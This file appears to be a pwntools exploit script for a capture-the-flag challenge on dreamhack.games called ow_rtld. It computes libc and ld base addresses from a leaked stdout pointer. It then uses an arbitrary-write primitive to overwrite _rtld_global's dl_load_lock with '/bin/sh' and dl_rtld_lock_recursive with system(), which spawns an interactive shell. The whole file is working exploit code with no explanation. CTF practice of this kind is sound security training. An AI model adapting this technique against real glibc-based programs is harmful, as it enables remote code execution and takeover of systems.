#!/usr/bin/env python3
# Name: ow_rtld.py
from pwn import *
#p = process('./ow_rtld')
p = remote('host3.dreamhack.games', 24116)
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')
p.recvuntil(b': ')
stdout = int(p.recvuntil(b'\n'), 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3f1000
print('libc_base..', hex(libc_base))
print('ld_base..', hex(ld_base))
rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3840
print('rtld_global..', hex(rtld_global))
print('dl_load_lock..', hex(dl_load_lock))
print('dl_rtld_lock_recursive..', hex(dl_rtld_lock_recursive))
system = libc_base + libc.symbols['system']
print('system..', hex(system))
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_load_lock).encode())
p.sendlineafter(b'data: ', str(u64('/bin/sh\x00')).encode())
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b'data: ', str(system).encode())
p.sendlineafter(b'> ', b'2')
p.interactive()